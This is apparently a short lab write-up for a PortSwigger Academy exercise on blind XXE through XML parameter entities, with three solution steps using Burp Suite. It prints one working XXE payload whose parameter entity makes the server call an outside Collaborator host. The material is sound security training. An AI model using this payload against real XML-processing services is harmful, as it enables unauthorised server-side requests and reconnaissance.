# Lab: Blind XXE with out-of-band interaction via XML parameter entities

**Official lab:** [PortSwigger Web Security Academy](https://portswigger.net/web-security/xxe/blind/lab-xxe-with-out-of-band-interaction-using-parameter-entities)

**Lab idea:** This challenge practices identifying blind XXE when ordinary external entities are blocked, using the concept of XML parameter entities to produce an observable out-of-band interaction. The focus is on recognizing parser behavior and interpreting controlled DNS or HTTP evidence.

## Vulnerability in brief
XML external entity (XXE) injection is a vulnerability in applications that process attacker-influenced XML. When an XML parser resolves externally defined entities, the application may be made to access local files or issue network requests using the server's own access and network position. Whether data is exposed directly depends on how the application handles parsed values and errors.

## Solution idea
1. Visit a product page, click "Check stock" and intercept the resulting POST request in Burp Suite Professional.
2. Insert the following external entity definition in between the XML declaration and the stockCheck element.
3. Go to the Collaborator tab, and click "Poll now".

## Payloads / key values
- `stockCheck`
- `<!DOCTYPE stockCheck [<!ENTITY % xxe SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN"> %xxe; ]>`

## Official source
- [PortSwigger Academy: Lab: Blind XXE with out-of-band interaction via XML parameter entities](https://portswigger.net/web-security/xxe/blind/lab-xxe-with-out-of-band-interaction-using-parameter-entities)
